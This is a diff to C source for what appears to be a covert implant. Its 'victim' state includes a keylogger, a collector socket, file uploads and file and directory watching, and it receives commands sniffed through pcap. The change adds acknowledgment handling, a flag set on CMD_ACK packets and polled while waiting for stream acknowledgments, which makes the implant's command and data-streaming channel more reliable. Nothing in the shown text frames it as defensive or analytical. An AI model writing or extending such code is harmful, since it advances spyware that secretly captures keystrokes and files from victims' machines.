@@ -85,6 +85,7 @@ typedef struct {
     char upload_temp_path[REMOTE_PATH_MAX + 8];
     watch_state_t file_watch;
     watch_state_t directory_watch;
+    volatile int stream_ack_received;
 } victim_state_t;
 
 static volatile sig_atomic_t g_running = 1;
@@ -183,6 +184,7 @@ static void init_state(victim_state_t *state) {
     state->collector_sock = -1;
     state->expected_seq = SEQ_INIT;
     state->next_seq = SEQ_INIT;
+    state->stream_ack_received = 0;
     keylogger_state_init(&state->keylogger);
 }
 
@@ -860,6 +862,10 @@ static void pcap_session_handler(u_char *args, const struct pcap_pkthdr *header,
 
     state->expected_seq++;
 
+    if (parsed.command == CMD_ACK) {
+        state->stream_ack_received = 1;
+    }
+
     printf("Command %s (0x%02x) received from %s\n",
            protocol_command_name(parsed.command),
            parsed.command,
@@ -997,6 +1003,8 @@ static int send_response_raw(victim_state_t *state, const struct sockaddr_in *pe
 
 static int wait_for_stream_ack(victim_state_t *state) {
     struct timeval start;
+
+    state->stream_ack_received = 0;
     gettimeofday(&start, NULL);
 
     while (1) {
@@ -1007,6 +1015,11 @@ static int wait_for_stream_ack(victim_state_t *state) {
 
         if (!state->session_active) {
             return -1;
+        }
+
+        if (state->stream_ack_received) {
+            state->stream_ack_received = 0;
+            return 0;
         }
 
         gettimeofday(&now, NULL);
@@ -1094,6 +1107,10 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
             } else {
                 result = send_response(state, peer_addr, CMD_ERROR, message);
             }
+            break;
+
+        case CMD_ACK:
+            result = 0;
             break;
 
         case CMD_DISCONNECT:
